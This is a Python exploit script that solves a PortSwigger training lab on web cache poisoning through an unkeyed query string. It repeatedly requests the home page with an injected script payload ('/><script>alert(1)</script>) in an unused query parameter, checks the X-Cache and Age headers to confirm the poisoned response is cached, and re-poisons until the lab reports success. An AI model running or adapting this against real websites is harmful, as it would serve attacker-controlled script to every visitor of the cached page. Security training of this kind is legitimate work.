# Web cache poisoning via an unkeyed query string

# https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_sequence(s, url):
	cache_poison = "/?gwyo='/><script>alert(1)</script>"
	print('[+] Trying to poison the cache for the home page:\n\t%s' % cache_poison)
	cache_url = url + cache_poison
	s.cookies.clear()
	solved = False
	while solved == False:
		s.headers.clear()
		s.cookies.clear()
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
			solved = True
			break
		print('\n[+] Sending cache poisoning request...')
		headers = {'Origin': url}
		r = s.get(cache_url, headers=headers, allow_redirects=False)
		time.sleep(2)
		if "X-Cache" in r.headers:
			if r.headers['X-Cache'] == 'hit':
				s.headers.clear()
				r = s.get(cache_url, allow_redirects=False)
				if "X-Cache" in r.headers:
					if r.headers['X-Cache'] == "hit":
						print('[+] Cache poisoned')
						print('[+] Waiting %s seconds before retry...' % str(35 - int(r.headers['Age'])))
						time.sleep(35 - int(r.headers['Age']))
					else:
						print('[+] Received "X-cache: miss"...')
						time.sleep(2)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning via an unkeyed query string')
	parser = argparse.ArgumentParser(description="[+] Lab: Web cache poisoning via an unkeyed query string")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send Web Cache Poisoning attack...\n')
			time.sleep(1)
			send_sequence(s, url)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
